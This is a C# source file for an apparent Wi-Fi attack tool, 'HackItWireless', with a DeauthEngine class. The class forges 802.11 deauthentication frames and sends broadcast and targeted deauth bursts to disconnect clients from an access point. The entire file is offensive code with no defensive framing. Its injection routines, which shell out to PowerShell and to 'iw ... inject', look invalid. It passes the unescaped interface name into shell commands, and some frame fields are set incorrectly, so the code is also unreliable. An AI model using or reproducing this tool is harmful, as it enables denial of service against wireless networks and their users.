using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace HackItWireless
{
    public sealed class DeauthEngine
    {
        private static readonly Random Rng = new();

        public byte[] BuildDeauthFrame(string bssid, string stationMac, ushort reasonCode = 7)
        {
            if (string.IsNullOrWhiteSpace(bssid))
                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
            if (string.IsNullOrWhiteSpace(stationMac))
                throw new ArgumentException("Station MAC cannot be null or empty.", nameof(stationMac));

            byte[] bssidBytes = ParseMac(bssid);
            byte[] stationBytes = ParseMac(stationMac);

            byte[] frame = new byte[26];
            int offset = 0;

            frame[offset] = 0xC0;
            offset++;

            frame[offset] = 0x00;
            offset++;

            ushort duration = 256;
            frame[offset] = (byte)(duration & 0xFF);
            frame[offset + 1] = (byte)((duration >> 8) & 0xFF);
            offset += 2;

            Array.Copy(stationBytes, 0, frame, offset, 6);
            offset += 6;

            Array.Copy(bssidBytes, 0, frame, offset, 6);
            offset += 6;

            Array.Copy(bssidBytes, 0, frame, offset, 6);
            offset += 6;

            frame[offset] = 0;
            frame[offset + 1] = 0;
            offset += 2;

            frame[offset] = (byte)(reasonCode & 0xFF);
            frame[offset + 1] = (byte)((reasonCode >> 8) & 0xFF);

            return frame;
        }

        public async Task SendDeauthBurst(string interfaceName, string bssid, int count = 10, int delayMs = 10)
        {
            if (string.IsNullOrWhiteSpace(interfaceName))
                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));
            if (string.IsNullOrWhiteSpace(bssid))
                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));

            string broadcastMac = "FF:FF:FF:FF:FF:FF";

            for (int i = 0; i < count; i++)
            {
                byte[] frame = BuildDeauthFrame(bssid, broadcastMac, 7);
                await InjectFrame(interfaceName, frame).ConfigureAwait(false);
                await Task.Delay(delayMs).ConfigureAwait(false);
            }
        }

        public async Task SendTargetedDeauth(string interfaceName, string bssid, string stationMac, int count = 5)
        {
            if (string.IsNullOrWhiteSpace(interfaceName))
                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));
            if (string.IsNullOrWhiteSpace(bssid))
                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
            if (string.IsNullOrWhiteSpace(stationMac))
                throw new ArgumentException("Station MAC cannot be null or empty.", nameof(stationMac));

            for (int i = 0; i < count; i++)
            {
                byte[] frameFromAp = BuildDeauthFrame(bssid, stationMac, 7);
                await InjectFrame(interfaceName, frameFromAp).ConfigureAwait(false);

                byte[] frameFromClient = BuildDeauthFrame(stationMac, bssid, 7);
                await InjectFrame(interfaceName, frameFromClient).ConfigureAwait(false);

                await Task.Delay(5).ConfigureAwait(false);
            }
        }

        public async Task BroadcastDeauth(string interfaceName, string bssid, int count = 20)
        {
            await SendDeauthBurst(interfaceName, bssid, count, 5).ConfigureAwait(false);
        }

        private async Task InjectFrame(string interfaceName, byte[] frame)
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                string hex = Convert.ToHexString(frame);
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"[System.IO.File]::WriteAllBytes('\\\\.\\{interfaceName}', 0x{hex})\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                using var proc = Process.Start(psi);
                if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                string hex = BitConverter.ToString(frame).Replace("-", "");
                var psi = new ProcessStartInfo
                {
                    FileName = "bash",
                    Arguments = $"-c \"echo '{hex}' | xxd -r -p | iw dev {interfaceName} inject -\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                using var proc = Process.Start(psi);
                if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
            }
            else
            {
                throw new PlatformNotSupportedException("Frame injection is only supported on Windows and Linux.");
            }
        }

        internal static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            if (clean.Length != 12)
                throw new ArgumentException($"Invalid MAC address: {mac}", nameof(mac));

            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++)
                bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);

            return bytes;
        }
    }
}
